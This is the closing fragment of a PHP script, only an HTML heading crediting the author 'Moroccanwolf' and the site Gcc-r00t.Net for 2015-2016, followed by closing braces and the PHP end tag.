<h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
 }
   }
      }

?>
